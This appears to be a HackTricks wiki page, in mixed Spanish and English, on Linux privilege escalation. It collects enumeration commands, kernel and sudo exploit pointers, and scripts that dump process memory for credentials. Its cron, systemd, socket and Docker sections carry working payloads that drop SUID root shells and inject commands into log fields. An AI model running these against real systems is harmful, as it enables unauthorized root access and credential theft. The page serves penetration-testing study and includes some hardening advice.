# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Información del sistema

### Información del OS

Comencemos a obtener información sobre el OS en ejecución
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Si **tienes permisos de escritura en cualquier carpeta dentro de la variable `PATH`** podrías ser capaz de hijack algunas libraries o binaries:
```bash
echo $PATH
```
### Info del entorno

¿Información interesante, contraseñas o claves API en las variables de entorno?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Comprueba la versión del kernel y si existe algún exploit que pueda usarse para escalar privilegios
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puedes encontrar una buena lista de kernels vulnerables y algunos **compiled exploits** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Otros sitios donde puedes encontrar algunos **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones de kernel vulnerables de ese sitio web puedes hacer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Herramientas que pueden ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN victim, solo comprueba exploits para kernel 2.x)

Siempre **busca la versión del kernel en Google**, puede que tu versión del kernel aparezca en algún kernel exploit y así sabrás que ese exploit es válido.

Técnicas adicionales de explotación del kernel:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalada de privilegios en Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo versión

Basado en las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
Puedes comprobar si la versión de sudo es vulnerable usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Las versiones de Sudo anteriores a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permiten a usuarios locales sin privilegios escalar sus privilegios a root mediante la opción sudo `--chroot` cuando el archivo `/etc/nsswitch.conf` se utiliza desde un directorio controlado por el usuario.

Aquí hay un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explotar esa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y que soporte la función `chroot`.

Para más información, consulta el original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verificación de firma fallida

Consulta **smasher2 box of HTB** para un **ejemplo** de cómo se podría explotar esta vuln
```bash
dmesg 2>/dev/null | grep "signature"
```
### Más enumeración del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar posibles defensas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Si estás dentro de un container, comienza con la siguiente sección container-security y luego pivota hacia las páginas de abuso específicas del runtime:

{{#ref}}
container-security/
{{#endref}}

## Unidades

Revisa **qué está montado y qué está desmontado**, dónde y por qué. Si algo está desmontado puedes intentar montarlo y comprobar si contiene información privada
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binarios útiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Además, comprueba si **hay algún compilador instalado**. Esto es útil si necesitas usar algún kernel exploit, ya que se recomienda compilarlo en la máquina donde lo vas a utilizar (o en una similar).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software instalado vulnerable

Compruebe la **versión de los paquetes y servicios instalados**. Quizá haya alguna versión antigua de Nagios (por ejemplo) que podría ser explotada para escalating privileges…\
Se recomienda comprobar manualmente la versión del software instalado que resulte más sospechoso.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina también podrías usar **openVAS** para comprobar software desactualizado y vulnerable instalado en la máquina.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil; por lo tanto, se recomiendan aplicaciones como OpenVAS o similares que verifiquen si alguna versión de software instalada es vulnerable a exploits conocidos_

## Procesos

Observa **qué procesos** se están ejecutando y verifica si algún proceso tiene **más privilegios de los que debería** (¿quizá un tomcat ejecutándose como root?)
```bash
ps aux
ps -ef
top -n 1
```
Siempre revisa si hay [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detecta esos comprobando el parámetro `--inspect` dentro de la línea de comandos del proceso.\
También **revisa tus privilegios sobre los binarios de los procesos**, quizá puedas sobrescribir alguno.

### Monitorización de procesos

Puedes usar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorizar procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan con frecuencia o cuando se cumplen un conjunto de requisitos.

### Memoria de procesos

Algunos servicios de un servidor guardan **credenciales en texto claro dentro de la memoria**.\
Normalmente necesitarás **privilegios root** para leer la memoria de procesos que pertenecen a otros usuarios, por lo tanto esto suele ser más útil cuando ya eres root y quieres descubrir más credenciales.\
Sin embargo, recuerda que **como usuario normal puedes leer la memoria de los procesos que posees**.

> [!WARNING]
> Ten en cuenta que hoy en día la mayoría de las máquinas **no permiten ptrace por defecto**, lo que significa que no puedes volcar otros procesos que pertenezcan a tu usuario sin privilegios.
>
> El archivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla la accesibilidad de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos los procesos pueden ser depurados, siempre que tengan el mismo uid. Esta es la forma clásica de cómo funcionaba ptrace.
> - **kernel.yama.ptrace_scope = 1**: solo un proceso padre puede ser depurado.
> - **kernel.yama.ptrace_scope = 2**: Solo el administrador puede usar ptrace, ya que requiere la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Ningún proceso puede ser trazado con ptrace. Una vez establecido, se necesita un reinicio para habilitar de nuevo el trazado con ptrace.

#### GDB

Si tienes acceso a la memoria de un servicio FTP (por ejemplo) podrías obtener el Heap y buscar dentro las credenciales.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso dado, **maps muestra cómo se mapea la memoria dentro de ese proceso** en el espacio de direcciones virtuales; también muestra los **permisos de cada región mapeada**. El archivo pseudo **mem** **expone la memoria del proceso en sí**. A partir del archivo **maps** sabemos qué **regiones de memoria son legibles** y sus offsets. Usamos esta información para **seek into the mem file and dump all readable regions** en un archivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. El espacio de direcciones virtuales del kernel puede accederse usando /dev/kmem.\
Típicamente, `/dev/mem` solo es legible por **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para linux

ProcDump es una reinterpretación para Linux de la clásica herramienta ProcDump de la suite Sysinternals para Windows. Consíguelo en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Herramientas

Para volcar la memoria de un proceso, puedes usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso que posees
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales desde la memoria del proceso

#### Ejemplo manual

Si encuentras que el proceso authenticator está en ejecución:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puedes dump the process (véase las secciones anteriores para encontrar diferentes formas de dump the memory of a process) y buscar credentials dentro de la memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) robará **credenciales en texto claro desde la memoria** y desde algunos **archivos bien conocidos**. Requiere privilegios root para funcionar correctamente.

| Funcionalidad                                    | Nombre del proceso   |
| ------------------------------------------------- | -------------------- |
| Contraseña de GDM (Kali Desktop, Debian Desktop)  | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (conexiones FTP activas)                   | vsftpd               |
| Apache2 (sesiones HTTP Basic Auth activas)        | apache2              |
| OpenSSH (sesiones SSH activas - uso de sudo)      | sshd:                |

#### Regexes de búsqueda/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tareas programadas/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Si un panel web “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y está vinculado solo a loopback, aún puedes acceder a él mediante SSH local port-forwarding y crear una tarea privilegiada para escalar.

Typical chain
- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciales en artefactos operativos:
- Copias de seguridad/scripts con `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crear un high-priv job y ejecutarlo inmediatamente (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Úsalo:
```bash
/tmp/rootshell -p   # root shell
```
Endurecimiento
- No ejecutes Crontab UI como root; restrínjalo a un user dedicado con permisos mínimos
- Enlaza a localhost y además restringe el acceso vía firewall/VPN; no reutilices contraseñas
- Evita incrustar secrets en unit files; usa secret stores o un EnvironmentFile accesible solo por root
- Habilita audit/logging para ejecuciones de jobs bajo demanda

Revisa si algún scheduled job es vulnerable. Quizá puedas aprovechar un script ejecutado por root (wildcard vuln? ¿puedes modificar archivos que root usa? ¿usar symlinks? ¿crear archivos específicos en el directorio que root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### PATH en cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar el PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observa cómo el usuario "user" tiene privilegios de escritura sobre /home/user_)

Si dentro de este crontab el usuario root intenta ejecutar algún comando o script sin establecer el PATH. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener una shell root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando un script con un wildcard (Wildcard Injection)

Si un script ejecutado por root tiene un “**\***” dentro de un comando, podrías explotarlo para provocar cosas inesperadas (como privesc). Ejemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si el wildcard está precedido por una ruta como** _**/some/path/\***_ **, no es vulnerable (incluso** _**./\***_ **no lo es).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Por qué funciona: En Bash, las expansiones ocurren en este orden: parameter/variable expansion, command substitution, arithmetic expansion, luego word splitting y pathname expansion. Así, un valor como `$(/bin/bash -c 'id > /tmp/pwn')0` se sustituye primero (ejecutando el comando), luego el `0` numérico restante se usa para la aritmética y el script continúa sin errores.

- Patrón vulnerable típico:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Explotación: Haz que texto controlado por el atacante se escriba en el log parseado de modo que el campo que parece numérico contenga una command substitution y termine con un dígito. Asegúrate de que tu comando no imprima en stdout (o redirígelo) para que la aritmética siga siendo válida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Si **puedes modificar un cron script** ejecutado por root, puedes obtener una shell muy fácilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root usa un **directorio donde tienes acceso completo**, podría ser útil eliminar ese directorio y **crear un symlink a otro** que sirva un script controlado por ti
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validación de Symlink y manejo de archivos más seguro

Cuando revises scripts/binarios privilegiados que leen o escriben archivos por ruta, verifica cómo se manejan los links:

- `stat()` sigue un symlink y devuelve los metadatos del destino.
- `lstat()` devuelve los metadatos del link en sí.
- `readlink -f` y `namei -l` ayudan a resolver el destino final y a mostrar los permisos de cada componente de la ruta.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Para defensores/desarrolladores, los patrones más seguros contra trucos con symlink incluyen:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### Binarios de cron firmados a medida con payloads escribibles
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Tareas de cron frecuentes

Puedes monitorizar los procesos para buscar procesos que se ejecutan cada 1, 2 o 5 minutos. Quizá puedas aprovecharlo para escalar privilegios.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitorizará y listará cada proceso que se inicie).

### Backups de root que preservan los mode bits establecidos por el atacante (pg_basebackup)

Si un cron perteneciente a root envuelve `pg_basebackup` (o cualquier copia recursiva) sobre un directorio de base de datos en el que puedes escribir, puedes plantar un **SUID/SGID binary** que será recopiado como **root:root** con los mismos mode bits en la salida del backup.

Flujo típico de descubrimiento (como usuario de DB con bajos privilegios):
- Usa `pspy` para detectar un cron de root que llame a algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` cada minuto.
- Confirma que el cluster origen (p. ej., `/var/lib/postgresql/14/main`) es escribible por ti y que el destino (`/opt/backups/current`) pasa a ser propiedad de root después del trabajo.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Esto funciona porque `pg_basebackup` preserva los bits de modo de archivo al copiar el clúster; cuando se invoca como root, los archivos de destino heredan **root ownership + attacker-chosen SUID/SGID**. Cualquier rutina privilegiada de backup/copy similar que mantenga los permisos y escriba en una ubicación ejecutable es vulnerable.

### Cron jobs invisibles

Es posible crear un cronjob **poniendo un carriage return después de un comentario** (sin carácter de nueva línea), y el cron job funcionará. Ejemplo (nota el carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servicios

### Archivos _.service_ escribibles

Comprueba si puedes escribir cualquier archivo `.service`, si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio se **inicie**, se **reinicie** o se **detenga** (quizá necesites esperar hasta que la máquina se reinicie).\
Por ejemplo, crea tu backdoor dentro del archivo `.service` con **`ExecStart=/tmp/script.sh`**

### Binarios de servicio escribibles

Ten en cuenta que si tienes **permisos de escritura sobre binarios ejecutados por servicios**, puedes cambiarlos por backdoors para que cuando los servicios se vuelvan a ejecutar, los backdoors se ejecuten.

### systemd PATH - Rutas relativas

Puedes ver el PATH usado por **systemd** con:
```bash
systemctl show-environment
```
Si descubres que puedes **write** en cualquiera de las carpetas de la ruta, puede que puedas **escalate privileges**. Necesitas buscar **relative paths being used on service configurations** en archivos como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Entonces, crea un **executable** con el **mismo nombre que el binario de ruta relativa** dentro de la carpeta del PATH de systemd en la que puedas escribir, y cuando al servicio se le solicite ejecutar la acción vulnerable (**Start**, **Stop**, **Reload**), tu **backdoor será ejecutado** (los usuarios sin privilegios normalmente no pueden iniciar/detener servicios, pero comprueba si puedes usar `sudo -l`).

**Aprende más sobre servicios con `man systemd.service`.**

## **Timers**

**Timers** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` que controlan archivos o eventos `**.service**`. **Timers** pueden usarse como una alternativa a cron, ya que tienen soporte integrado para eventos de tiempo calendario y eventos de tiempo monotónico, y pueden ejecutarse de forma asíncrona.

Puedes enumerar todos los timers con:
```bash
systemctl list-timers --all
```
### Timers escribibles

Si puedes modificar un timer, puedes hacer que ejecute algunas unidades existentes de systemd.unit (como un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
En la documentación puedes leer qué es la Unidad:

> La unidad que se activa cuando este timer expira. El argumento es un nombre de unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor por defecto es un service que tiene el mismo nombre que la unidad timer, excepto por el sufijo. (Véase arriba.) Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del timer se nombren idénticamente, salvo por el sufijo.

Therefore, to abuse this permission you would need to:

- Encontrar alguna unidad systemd (como una `.service`) que esté **ejecutando un binario escribible**
- Encontrar alguna unidad systemd que esté **ejecutando una ruta relativa** y sobre la cual tengas **privilegios de escritura** en el **systemd PATH** (para suplantar ese ejecutable)

**Learn more about timers with `man systemd.timer`.**

### **Habilitar Timer**

Para habilitar un timer necesitas privilegios de root y ejecutar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permiten la **comunicación entre procesos** en la misma u otras máquinas dentro de modelos cliente-servidor. Utilizan archivos de descriptor Unix estándar para la comunicación entre equipos y se configuran mediante archivos `.socket`.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Dentro de este archivo, se pueden configurar varios parámetros interesantes:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes, pero en resumen se usan para **indicar dónde va a escuchar** el socket (la ruta del archivo de socket AF_UNIX, el IPv4/6 y/o el número de puerto a escuchar, etc.)
- `Accept`: Toma un argumento booleano. Si es **true**, se **crea una instancia de servicio por cada conexión entrante** y solo se le pasa el socket de la conexión. Si es **false**, todos los sockets en escucha se **pasan a la unidad de service iniciada**, y solo se crea una unidad de service para todas las conexiones. Este valor se ignora para sockets datagrama y FIFOs donde una única unidad de service maneja incondicionalmente todo el tráfico entrante. **Por defecto es false**. Por razones de rendimiento, se recomienda escribir nuevos daemons solo de forma compatible con `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceptan una o más líneas de comando, las cuales se **ejecutan antes** o **después** de que los **sockets**/FIFOs en escucha sean **creados** y vinculados, respectivamente. El primer token de la línea de comando debe ser un nombre de archivo absoluto, seguido de los argumentos para el proceso.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionales que se **ejecutan antes** o **después** de que los **sockets**/FIFOs en escucha sean **cerrados** y eliminados, respectivamente.
- `Service`: Especifica el nombre de la unidad de **service** **a activar** con tráfico entrante. Esta opción solo está permitida para sockets con Accept=no. Por defecto apunta al service que tiene el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos no debería ser necesario usar esta opción.

### Archivos `.socket` escribibles

Si encuentras un archivo `.socket` **escribible** puedes **añadir** al principio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y el backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente necesitarás esperar hasta que la máquina se reinicie.**\ _Nota que el sistema debe estar usando esa configuración de archivo de socket o el backdoor no se ejecutará_

### Socket activation + writable unit path (create missing service)

Otra mala configuración de alto impacto es:

- una unidad socket con `Accept=no` y `Service=<name>.service`
- la unidad de service referenciada está ausente
- un atacante puede escribir en `/etc/systemd/system` (u otra ruta de búsqueda de unidades)

En ese caso, el atacante puede crear `<name>.service`, luego generar tráfico hacia el socket para que systemd cargue y ejecute el nuevo servicio como root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets con permiso de escritura

Si **identificas algún socket con permiso de escritura** (_ahora estamos hablando de Unix Sockets y no de los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y posiblemente explotar una vulnerabilidad.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexión raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ejemplo de explotación:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Ten en cuenta que puede haber algunos **sockets listening for HTTP** requests (_no estoy hablando de archivos .socket sino de los archivos que actúan como unix sockets_). Puedes comprobarlo con:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si el socket **responde a una petición HTTP**, entonces puedes **comunicarte** con él y quizá **explotar alguna vulnerabilidad**.

### Docker socket con permisos de escritura

El Docker socket, a menudo ubicado en `/var/run/docker.sock`, es un archivo crítico que debe protegerse. Por defecto, es escribible por el usuario `root` y los miembros del grupo `docker`. Tener acceso de escritura a este socket puede conducir a privilege escalation. A continuación se desglosa cómo se puede hacer esto y métodos alternativos si Docker CLI no está disponible.

#### **Privilege Escalation con Docker CLI**

Si tienes acceso de escritura al Docker socket, puedes escalate privileges usando los siguientes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estos comandos te permiten ejecutar un container con acceso de nivel root al sistema de archivos del host.

#### **Using Docker API Directly**

En casos donde el Docker CLI no está disponible, el Docker socket aún puede manipularse usando la Docker API y comandos `curl`.

1.  **List Docker Images:** Recupera la lista de imágenes disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

